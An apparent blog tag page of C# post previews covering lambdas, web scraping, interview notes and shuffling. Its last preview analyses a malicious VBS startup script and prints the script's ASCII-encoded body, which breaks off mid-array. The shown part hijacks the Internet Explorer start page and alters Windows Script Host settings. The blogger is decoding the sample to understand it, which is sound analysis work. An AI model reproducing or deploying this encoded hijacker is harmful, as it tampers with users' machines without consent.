@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>C</title>
+  <meta property="og:title" content="C" />
+  <meta name="twitter:title" content="C" />
+  <meta name="author" content="bystander"/>
+  <link href='https://leizhiyuan.github.io/images/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta property="og:image" content="https://leizhiyuan.github.io/images/author.jpg" />
+  <meta name="twitter:image" content="https://leizhiyuan.github.io/images/author.jpg" />
+  <meta name="twitter:card" content="summary" />
+  <meta property="og:url" content="https://leizhiyuan.github.io/tags/c/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="bystander&#39;s blog" />
+
+  <meta name="generator" content="Hugo 0.49.2" />
+  <link rel="canonical" href="https://leizhiyuan.github.io/tags/c/" />
+  <link rel="alternate" href="https://leizhiyuan.github.io/tags/c/index.xml" type="application/rss+xml" title="bystander&#39;s blog">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://leizhiyuan.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+  <link rel="stylesheet" href="https://leizhiyuan.github.io/css/highlight.min.css" /><link rel="stylesheet" href="https://leizhiyuan.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+</head>
+
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://leizhiyuan.github.io/">bystander&#39;s blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="首页" href="/">首页</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="目录" href="/categories">目录</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="标签" href="/tags">标签</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="关于我" href="/about/">关于我</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="bystander&#39;s blog" href="https://leizhiyuan.github.io/">
+            <img class="avatar-img" src="https://leizhiyuan.github.io/images/author.jpg" alt="bystander&#39;s blog" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="tags-heading">
+              
+                <h1>C</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+  <div class="container" role="main">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        
+        <div class="posts-list">
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/12/18/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/">
+                <h2 class="post-title">Lambda高手之路第一部分</h2>
+
+                
+              </a>
+
+              <p class="post-meta">
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on December 18, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 2 minutes (329 words)
+  
+  
+</span>
+
+
+              </p>
+              <div class="post-entry">
+                
+                  好长时间没发技术文章了，恰好看到一篇非常详细的Lambda文章。一边翻译一边学习。题目好像有点霸气。。
+介绍 Lambda表达式是使代码更加动态，易于扩展并且更加快速（看完本文你就知道原因了）的强有力的工具。也可以用来降低潜在的错误。同时可以利用静态输入和智能提示，就像VS里一样。
+&nbsp;
+Lambda表达式在.net framework 3.5中提出来。并且在LINQ和ASP.NET MVC内部的一些技术中扮演了相当重要的角色。如果你考虑一下ASP.NET MVC中各类控件的实现。你就发现。奥妙就是他们大多使用了Lambda表达式。和Lambda表达式一起，使用Html扩展方法将会使得在后台创建模型成为可能。
+本文会讲到如下的知识。
+1.简短的介绍-Lambda表达式是什么，以及为什么和匿名方法不同（之前我们使用的） 2.走近Lambda表达式的性能-在哪些情况下比起标准方法，Lambda会提高/损失性能 3.深入-Lambda表达式在MSIL代码中是什么样 4.一些来自JS世界的模式映射到C#中 5.那些能够提高性能，并且代码看起来相当舒服的使用Lambda的情况。 6.一些我提出的新模式-当然有可能别人也提出来了。但这是我的思考结果。
+&nbsp;
+如果你期望本文是一篇入门教程我可能要让你失望了，除非你真的很优秀并且很聪明，当然我不是这种人，所以我也想提前声明一下：为了读懂这篇文章你可能需要C#的一些高级知识，并且对C#比较了解。
+&nbsp;
+你应该期望本文试着解释一些事情给你，也会解释一些有趣的问题，至少对我来说是这样的。最后我会展示一些实际的例子和模式，如我所说，Lambda表达式简化了很多情况。因此写显式的模式很有用。
+背景知识-什么是Lambda表达式 在C#1.0中，委托被提出了，它使得传递函数成为可能，一句话就是委托就是强类型的函数指针，但委托比指针更强大。一般传递一个函数需要如下几步。 1. 写一个委托（就像一个类）包含返回类型和参数类型 2. 使用委托作为某一个函数的参数类型，这样，该函数就可以接受和委托描述的有着相同签名的函数了 3. 将一个委托类型的函数传递给委托，创建一个委托实例。
+&nbsp;
+如果听起来很复杂，确实本来很复杂，但这是必需的。（虽然不是造火箭，但是比你认为的要更多的代码），然而步骤三不是必需的，编译器会为你做他，但是步骤1和2却是必不可少的。
+&nbsp;
+幸运的是C#2.0出现了泛型，现在我们也可以写泛型类，方法，更重要的是，泛型委托，然而，直到.net framework 3.5的时候。微软意识到实际上只有两种泛型委托（当然有一些不同的重载），会覆盖99%的使用情况：
+1.Action 没有任何输入参数，也没有输出参数。 2.Action&lt;t1,…t16&gt; 需要1-16个参数，没有输出参数。 3.Func&lt;t1….t16,tout&gt;需要0-16个参数，一个输出参数
+&nbsp;
+Action和其对应的泛型版本（仅仅是一个动作，执行一些事情）返回void的时候。Func则可以返回最后一个参数指定的类型，通过这两个委托类型，我们事实上，大部分情况下。前面提到的三步中的第一部就不用写的。而第二步仍然需要。
+&nbsp;
+那么如果我们想要运行代码的时候怎么做呢。在C#2.0中问题已经可以解决了。在这个版本里。我们可以创建委托方法，也就是一个匿名方法，然后这个语法一直未能流行起来，一个相当简化的匿名方法的版本类似这样： Func&lt;double, double&gt; square = delegate (double x) { return x * x; } 为了提高这种语法，欢迎来到Lambda表达式的国度。首先，这个Lambda名字怎么来的？事实上。来自于数学上的λ演算，更准确的说他是数学中一个正式的系统。用于通过变量绑定和替换来进行表达式计算，所以我们有0-N个输入参数和一个返回值，而在编程中，也可以没有返回值
+我们看一下Lambda表达式的一些例子 //编译器可以识别，然后就可以通过dummyLambda();来调用了 var dummyLambda = () =&gt; { Console.WriteLine(&ldquo;Hallo World from a Lambda expression!
+                  <a href="https://leizhiyuan.github.io/2012/12/18/lambda%E9%AB%98%E6%89%8B%E4%B9%8B%E8%B7%AF%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/windows/">windows</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%A4%A7%E5%AD%A6/">大学</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%AD%A6%E4%B9%A0/">学习</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E6%80%BB%E7%BB%93/">总结</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%BF%BB%E8%AF%91/">翻译</a>&nbsp;
+                  
+                </div>
+              
+
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/12/08/3%E5%88%86%E9%92%9F%E7%90%86%E8%A7%A3lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
+                <h2 class="post-title">3分钟理解Lambda表达式</h2>
+
+                
+              </a>
+
+              <p class="post-meta">
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on December 8, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (50 words)
+  
+  
+</span>
+
+
+              </p>
+              <div class="post-entry">
+                
+                  <p><strong>1.什么是Lambda表达式</strong></p>
+
+<p>Lambda表达式是一个匿名方法，通常在LINQ中被用来创建委托</p>
+
+<p>简单来说。它是一个没有声明，没有访问修饰符，没有返回值。甚至没有名字的方法。</p>
+
+<p>&nbsp;</p>
+
+<p><strong>2.为什么我们需要使用Lambda表达式？或者说为什么我们要写一个没有名字的函数？</strong></p>
+
+<p>为了方便，这种快捷方式允许你在调用的地方直接编写代码，尤其是你想调用的代码只会在这个地方使用一次。并且方法体本身很短。节省了单独写方法中写声明等等的麻烦。。</p>
+
+<p>好处</p>
+
+<p>1.代码量减少。不必写方法的名称。返回值和访问修饰符</p>
+
+<p>2.当阅读代码的时候。直接就可以看到被调用函数的代码，不用去别的地方。</p>
+
+<p>Lambda表示应该短些。太复杂了。可读性就下降了</p>
+
+<p>&nbsp;</p>
+
+<p><strong>如果编写Lambda表达式</strong></p>
+
+<p>Lambda基本的定义是：参数=&gt;执行代码</p>
+
+<p>举个例子
+<pre lang="cs">n = &gt; n % 2 == 1</pre>
+n是输入参数
+n % 2 == 1 是函数体</p>
+
+<p>你可以读作：给这个匿名方法传入一个参数n，如果n是奇数就返回true</p>
+
+<p>&nbsp;</p>
+
+<p><strong>使用该Lambda的例子</strong>
+<pre class="lang:default decode:true">List&lt;int&gt; numbers = new List&lt;int&gt;{11,37,52};
+List&lt;int&gt; oddNumbers = numbers.where(n =&gt; n % 2 == 1).ToList();
+//现在oddNumbers 里面就是11和37了</pre>
+ok.基本的Lambda表达式就是这样了。</p>
+
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/windows/">windows</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%BF%BB%E8%AF%91/">翻译</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%AE%BE%E8%AE%A1/">设计</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%BD%AF%E4%BB%B6/">软件</a>&nbsp;
+                  
+                </div>
+              
+
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/12/03/%E6%BA%90%E7%A0%81%E6%89%93%E5%8C%85%E4%B8%8B%E8%BD%BD%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%BC%94%E7%A4%BA%E5%8A%A8%E7%94%BB/">
+                <h2 class="post-title">[源码]打包下载算法与数据结构演示动画</h2>
+
+                
+              </a>
+
+              <p class="post-meta">
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on December 3, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 2 minutes (214 words)
+  
+  
+</span>
+
+
+              </p>
+              <div class="post-entry">
+                
+                  很早的时候，学习数据结构的时候。收集了一下演示的动画。帮助理解。但是不全。今天在看KMP算法的时候。看到了福州大学的一个精品课程。。81个演示动画呢。。想打包下载收藏。话说福州大学这才是好样的。踏踏实实搞学术。
+第一种方法就是手工了。。嘎嘎。你敢么。一个个下载。。。一个个改名。。
+第二种就是用整站下载的软件了。。但是我看了一下swf的命名。我就知道下载下来意义不大。因为名字不好理解。
+第三种就是自己写个程序吧。。
+&nbsp;
+整体思路，首先访问课程页面，解析得到每一章的标题和内容，然后创立章节文件夹，得到每个动画对应的html页面，然后对html页面解析，提取swf地址。然后下载就行了。
+比较疼的地方是那个页面用的是gb2312编码。而解析神器HtmlAgilityPack，不能指定编码。只能想办法绕过了。 WebClient client = new WebClient(); MemoryStream ms = new MemoryStream(client.DownloadData(url)); HtmlDocument doc = new HtmlDocument(); doc.Load(ms, Encoding.GetEncoding(&ldquo;gb2312&rdquo;)); 绕过方法就是先使用内置类得到内存流。然后从内存中加载。
+然后呢。涉及的技术就是xpath了。参考着xpath的文档。搞定了不少。中间还有一个地方就是我没注意看。这个页面有两个文件是一样名字。。调试了几次才发现。。 using System; using System.Collections.Generic; using System.Linq; using System.Text; using HtmlAgilityPack; using System.IO; using System.Threading; using System.Net;
+namespace FzuSwf { class Program { static void Main(string[] args) { DoWork(); }
+//执行任务 static void DoWork() { HtmlWeb web = new HtmlWeb(); HtmlDocument doc = web.Load(&#34;http://ds.fzu.edu.cn/fine/resources/&#34;); HtmlNode divResource = doc.
+                  <a href="https://leizhiyuan.github.io/2012/12/03/%E6%BA%90%E7%A0%81%E6%89%93%E5%8C%85%E4%B8%8B%E8%BD%BD%E7%AE%97%E6%B3%95%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%BC%94%E7%A4%BA%E5%8A%A8%E7%94%BB/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%A4%A7%E5%AD%A6/">大学</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%AD%A6%E4%B9%A0/">学习</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/">数据挖掘</a>&nbsp;
+                  
+                </div>
+              
+
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/11/28/c#%E4%B8%8E.net-%E7%A8%8B%E5%BA%8F%E5%91%98%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/">
+                <h2 class="post-title">C#与.net 程序员面试笔记</h2>
+
+                
+              </a>
+
+              <p class="post-meta">
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on November 28, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (70 words)
+  
+  
+</span>
+
+
+              </p>
+              <div class="post-entry">
+                
+                  这是前几天读的书。书不难。10-13章跳过了。以后再看。
+以前，一个应用程序对应一个进程。并且为该进程指定虚拟内存，这样。进程会消耗很多资源，而且进程之间的通信业比较麻烦
+应用程序域可以理解为很多应用程序域都可以运行在同一个.net 进程中，降低内存消耗。同时不同的域之间隔离。安全有保证。通信也简单。
+程序集是指包含编译好的。面向.net framework的代码的逻辑单元。是完全自我描述性的一个逻辑单元。可以存储在多个文件中。简单来说，程序集就是几个彼此有关联程序文件的集合。程序集会包含程序的元数据。描述了对应代码中定义的方法和类型。
+装箱和拆箱：装箱转换是将一个值类型显式或隐式的转换成一个object对象。并且把这个对象转换成一个被该值类型应用的的接口类型。装箱后的object对象中的数据位于堆中。一般应该避免这种运算。 CLR将值类型的数据包裹到匿名的托管对象中，并将托管对象的引用放在Object类型的变量中。这个过程称为装箱。一般还是使用泛型来代替多好。
+值类型和引用类型：值类型实例通常分配在线程的栈上。并且不包含指向任何实例数据的指针。引用类型实例分配在托管堆上。变量保存了实例数据的内存引用。引用类型复制的话会导致引用同一个内存地址。
+C#预处理指令是在编译时调用的。预处理指令通知C#编译器要编译哪些代码。并指出如何处理特定的错误和异常。比如用在一些调试的时候。在顶部define一个debug 内部的测试部分写上测试用例。具体示例 //定义条件变量，注意条件变量的定义要在代码的最前面 #define Debug using System; namespace MyConsole { class Preprocesor { public static void Main() { //如果条件变量是Debug则运行单元调试代码，再运行功能模块返回运行结果 #if Debug Console.WriteLine(&ldquo;运行单元测试模块&rdquo;); Console.WriteLine(&ldquo;运行功能模块，返回输出结果&rdquo;); Console.Read(); #elif Release //如果条件变量是Release，则直接运行功能模块返回运行结果 Console.WriteLine(&ldquo;运行功能模块，返回输出结果&rdquo;); Console.Read(); #endif } } } C#中的指针 指针是一个无符号整数。是以当前系统寻址范围为取值范围的整数，CLR支持三种指针类型：受托管指针，非托管指针，非托管函数指针，受托管指针存储在堆上的托管块的引用，一个非托管指针就是传统意义上的指针，要放在unsafe中使用，C#中指针并不继承自Object
+String 是CLR的类型名称。而string是C#的关键字。其实C#编译时。。会增下如下代码： using string=System.String
+Array 到ArrayList的转换 1.使用ArrayList.Adapter(ArrayName) 可以直接得到ArrayList 2.使用遍历逐个添加到ArrayList里。 反向的话直接使用(Array[])ArrayListName.ToArray(typeof(Array));即可
+checked和unchecked语句用于控制整形算术运算和显示转换的溢出检查上下文。checked关键字用于对整型算术运算和转换显式启用溢出检查。因为默认情况下。如果表达式产生的值超过了类型的范围。则常数表达式将会导致编译时错误。而非常数表达式则在运行时计算并将引发异常。
+Asp.Net 中的Request对象主要功能是从客户端得到数据信息。他的属性比较多。比如UserLanguage，TotalBytes，Path，ApplicationPath
+ViewState是其的一个重要特性。用于把生成页面要用的状态值保存到一个隐藏域里。而不是用cookie/内存
+SOAP是Web Service应用的基础协议。他是一种轻量的简单的。基于xml的协议。被设计成在wEb上交换结构化的和固有的信息。 WSDL是一种用于描述web服务和说明如何与Web服务通信的XML语言。WSDL是一种符合XML语法规范的语言。它的设计完全基于Soap协议的实现。当一个WEb Service 服务器期望为使用者提供服务说明时，WSDL语言是最好的选择之一。
+&nbsp;
+对企业的一些认识 
+千万不要说自己未来的打算是做到管理层，首先对管理层的定义不清楚。职务不清楚。所以保险的答案是我会努力钻研技术。使得能够达到业内的专业人士。深刻理解公司和行业
+我是为了找一份长期性的工作。我不喜欢频繁的跳槽我希望在这个利于发展自己的事业。深入学习。向专业人士请教。那。该我想问这个职务是长期的吗？
+不要把公司想像成慈善机构。工作的运作方面应该是尽可能快的实现盈利。树立品牌，赢得客户。我的工作就是完成企业的良性运作。
+如果被问到是否需要考虑看分数。应该说用人单位确实需要全面考量。也要考虑应聘者的工作积极性/服从性。实际经验/对开发的理解诶。这些也许比分数更有价值。
+                  <a href="https://leizhiyuan.github.io/2012/11/28/c#%E4%B8%8E.net-%E7%A8%8B%E5%BA%8F%E5%91%98%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%A4%A7%E5%AD%A6/">大学</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%BC%80%E5%8F%91/">开发</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E6%80%BB%E7%BB%93/">总结</a>&nbsp;
+                  
+                </div>
+              
+
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/11/25/c#%E6%A8%A1%E6%8B%9F%E6%89%8B%E5%B7%A5%E6%B4%97%E7%89%8C%E9%99%84%E6%B5%8B%E8%AF%95/">
+                <h2 class="post-title">C#模拟手工洗牌(附测试)</h2>
+
+                
+              </a>
+
+              <p class="post-meta">
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on November 25, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 2 minutes (240 words)
+  
+  
+</span>
+
+
+              </p>
+              <div class="post-entry">
+                
+                  洗牌大家都知道，代码实现最广泛的一种就是产生两个随机数，然后交换这两个随机数为下标的牌，但是这种的洗牌并不能保证同概率，你可以参考本文做一些测试，本文代码没啥可说的。我写出了非常详细的注释
+ps:刚开始写那个随机数的时候，我随便给了个种子2012.。结果你懂的。。意外意外。这个全局的result数组让我很疼，代码有什么可以改进的，欢迎留言指出。不胜感激。 /*Author:Bystander *Blog:http://leaver.me Date:2012/11/24/ using System;
+class Program { static int[,] result; static void Main() { //初始牌的顺序，我只测试10张牌的情况 char[] _arr = { &lsquo;A&rsquo;, &lsquo;B&rsquo;, &lsquo;C&rsquo;, &rsquo;D&rsquo;, &lsquo;E&rsquo;, &lsquo;F&rsquo;, &lsquo;G&rsquo;, &lsquo;H&rsquo;, &lsquo;I&rsquo;, &lsquo;J&rsquo; }; result = new int[_arr.Length, _arr.Length]; //进行1000次，来统计结果的数字.
+for (int i = 0; i &amp;lt; 10000; i++) { ShuffleArray_Manual(_arr); SumCount(_arr); } int j = 0; foreach (int i in result) { if (j % result.GetLength(1) == 0) { Console.WriteLine(); } Console.
+                  <a href="https://leizhiyuan.github.io/2012/11/25/c#%E6%A8%A1%E6%8B%9F%E6%89%8B%E5%B7%A5%E6%B4%97%E7%89%8C%E9%99%84%E6%B5%8B%E8%AF%95/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/windows/">windows</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%AD%A6%E4%B9%A0/">学习</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E6%80%BB%E7%BB%93/">总结</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E8%AE%BE%E8%AE%A1/">设计</a>&nbsp;
+                  
+                </div>
+              
+
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2012/11/25/%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8Fvbs%E8%84%9A%E6%9C%AC%E7%9A%84%E7%AE%80%E5%8D%95%E8%A7%A3%E7%A0%81/">
+                <h2 class="post-title">一个恶意vbs脚本的简单解码</h2>
+
+                
+              </a>
+
+              <p class="post-meta">
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on November 25, 2012
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (148 words)
+  
+  
+</span>
+
+
+              </p>
+              <div class="post-entry">
+                
+                  今天把电脑还原到了11月7号。结果eset更新后报C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup这个目录有个zzs.vbs的不受欢迎的程序，当时没什么事，就打开看看。想知道是个什么东西。
+由于eset阻止，我就把文件拖出来。改个后缀。发现代码不长，前半段是ascii码编码的。。 strs = Array(68,111,13,10,32,32,32,32,83,101,116,32,111,98,106,87,77,73,83,101,114,118,105,99,101,32,61,32,71,101,116,79,98,106,101,99,116,40,34,119,105,110,109,103,109,116,115,58,92,92,46,92,114,111,111,116,92,99,105,109,118,50,34,41,13,10,32,32,32,32,83,101,116,32,99,111,108,80,114,111,99,101,115,115,101,115,32,61,32,111,98,106,87,77,73,83,101,114,118,105,99,101,46,69,120,101,99,81,117,101,114,121,40,34,83,101,108,101,99,116,32,42,32,102,114,111,109,32,87,105,110,51,50,95,80,114,111,99,101,115,115,34,41,13,10,32,32,32,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,48,13,10,32,32,32,32,70,111,114,32,69,97,99,104,32,111,98,106,80,114,111,99,101,115,115,32,73,110,32,99,111,108,80,114,111,99,101,115,115,101,115,13,10,32,32,32,32,32,32,32,32,73,102,32,111,98,106,80,114,111,99,101,115,115,46,78,97,109,101,32,61,32,34,117,115,101,114,105,110,105,116,46,101,120,101,34,32,84,104,101,110,13,10,32,32,32,32,32,32,32,32,32,32,32,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,49,13,10,32,32,32,32,32,32,32,32,32,32,32,32,69,120,105,116,32,70,111,114,13,10,32,32,32,32,32,32,32,32,69,110,100,32,73,102,13,10,32,32,32,32,78,101,120,116,13,10,32,32,32,32,73,102,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,48,32,84,104,101,110,32,69,120,105,116,32,68,111,13,10,32,32,32,32,87,83,99,114,105,112,116,46,83,108,101,101,112,32,49,48,48,13,10,76,111,111,112,13,10,13,10,115,80,97,103,101,32,61,32,34,104,116,116,112,58,47,47,119,119,119,46,57,57,57,46,99,111,109,47,63,111,110,101,34,13,10,13,10,83,101,116,32,111,98,106,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,13,10,111,98,106,83,104,101,108,108,46,82,101,103,87,114,105,116,101,32,34,72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,73,110,116,101,114,110,101,116,32,69,120,112,108,111,114,101,114,92,77,97,105,110,92,83,116,97,114,116,32,80,97,103,101,34,44,32,115,80,97,103,101,13,10,13,10,115,82,101,103,80,97,116,104,32,61,32,34,72,75,76,77,92,83,79,70,84,87,65,82,69,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,32,83,99,114,105,112,116,32,72,111,115,116,92,83,101,116,116,105,110,103,115,34,13,10,79,110,32,69,114,114,111,114,32,82,101,115,117,109,101,32,78,101,120,116,13,10,105,69,110,97,98,108,101,100,32,61,32,111,98,106,83,104,101,108,108,46,82,101,103,82,101,97,100,32,95,13,10,40,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,95,34,41,13,10,73,102,32,69,114,114,46,78,117,109,98,101,114,32,61,32,48,32,84,104,101,110,13,10,32,32,32,32,111,98,106,83,104,101,108,108,46,82,101,103,87,114,105,116,101,32,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,34,44,32,105,69,110,97,98,108,101,100,44,32,34,82,69,71,95,68,87,79,82,68,34,13,10,32,32,32,32,111,98,106,83,104,101,108,108,46,82,101,103,68,101,108,101,116,101,32,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,95,34,13,10,69,110,100,32,73,102,13,10,13,10,83,101,116,32,111,98,106,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,13,10,83,101,116,32,102,32,61,32,111,98,106,83,104,101,108,108,46,71,101,116,70,105,108,101,40,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,41,13,10,73,102,32,102,46,65,